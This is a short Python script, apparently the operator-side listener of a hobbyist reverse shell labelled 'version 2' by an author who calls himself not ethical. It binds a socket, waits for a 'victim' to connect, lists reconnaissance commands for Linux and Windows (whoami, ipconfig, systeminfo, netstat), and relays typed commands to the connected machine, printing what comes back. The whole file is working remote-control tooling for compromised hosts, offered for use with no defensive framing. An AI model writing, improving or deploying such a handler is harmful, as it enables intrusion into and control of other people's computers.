#Author aryan_not_ethical(instagram)
#This is version 2 of my reverse shell
'''
-Better interface
-All commands displayed
-Better handling
'''
import socket

IP = "127.0.0.1"
PORT = 50000
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((IP, PORT))
server.listen(10)

commands = '''
    ----------Working commands for Linux----------
    ls , ip a , ifconfig , pwd , whoami , man
    
    
    
    ----------Working commands for Windows----------
    dir , ipconfig , whoami , systeminfo , driverquery , hostname , netstat
    
'''
print("Listening for connections....")
while True:
    try:
        victim, addr = server.accept()
        print(f"[+] Victem Connected!!")
        print(commands)
        while True:
            cmd = input("Shell: ")
            victim.send(bytes(cmd, "utf-8"))
            msg = victim.recv(16384).decode("utf-8")   
            print("-----------------------------------------------")         
            print(msg)
            
    
    except Exception as e:
            print(f"[!] Error: {e}")
            
            

